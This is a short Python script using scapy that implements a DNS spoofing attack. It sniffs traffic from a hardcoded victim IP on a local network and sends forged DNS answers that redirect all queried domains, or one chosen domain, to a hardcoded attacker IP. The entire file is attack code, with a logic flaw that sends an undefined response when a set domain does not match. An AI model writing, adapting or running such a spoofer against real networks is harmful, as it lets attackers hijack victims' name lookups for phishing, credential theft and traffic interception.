from scapy.all import ARP, Ether, send, sniff, srp
from scapy.layers.dns import DNS,DNSQR,DNSRR,UDP,IP,TCP
class DNSSpoofer:
    def __init__(self,attacker_ip:str,victim_ip:str,domain=None) -> None:
        self.attacker_ip = attacker_ip
        self.victim_ip = victim_ip

        self.domain = domain

    def spit(self,pkt):
        """Spoof DNS responses for DNS queries."""
        if pkt.haslayer(DNS) and pkt[IP].src == self.victim_ip :

            qname = pkt[DNSQR].qname.decode()

            # Check for the domain you want to spoof
            #if b"example.com" in qname:  
            # Create the DNS response
            if self.domain :
                if self.domain.strip().lower() in qname :
                    dns_response = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                        UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                        DNS(
                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Spoofed response
                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Authority section
                        )
                    )
            else :
                dns_response = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # IP layer
                        UDP(dport=pkt[UDP].sport, sport=53) /  # UDP layer
                        DNS(
                            id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,  # Query data from original packet
                            an=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Spoofed response
                            ns=DNSRR(rrname=qname, ttl=60, rdata=self.attacker_ip),  # Authority section
                        )
                    )

            # Send the spoofed DNS response to the victim
            send(dns_response, verbose=False)
            print(f"[+] Sent spoofed DNS response with IP {self.attacker_ip} for {qname}")
    
    def sniff(self):
        sniff(filter="ip", prn=self.spit, store=0)

    def spoof(self):
        try:
            self.sniff()
        except KeyboardInterrupt:
            print("\nStopping DNS spoofing...")
            
if __name__ == "__main__":
    d = DNSSpoofer(attacker_ip='192.168.1.82',victim_ip="192.168.1.68")
    d.spoof()
